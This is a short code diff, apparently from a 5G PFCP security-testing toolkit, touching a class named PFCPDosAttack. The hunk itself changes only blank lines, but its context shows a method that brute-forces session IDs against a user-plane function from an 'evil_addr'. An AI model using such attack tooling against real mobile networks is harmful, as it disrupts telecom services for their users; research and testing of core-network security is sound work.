@@ -628,8 +628,8 @@ class PFCPDosAttack:
             "dest_port": dest_port
         }, "[Start_pfcp_session_modification_far_dupl_bruteforce]"):
             return
-        
-        
+         
+         
         PFCPToolkit_obj= PFCPToolkit(src_addr=evil_addr, dest_addr=upf_addr, src_port=src_port, dest_port=dest_port)
         for seid in range(1, session_range):
             
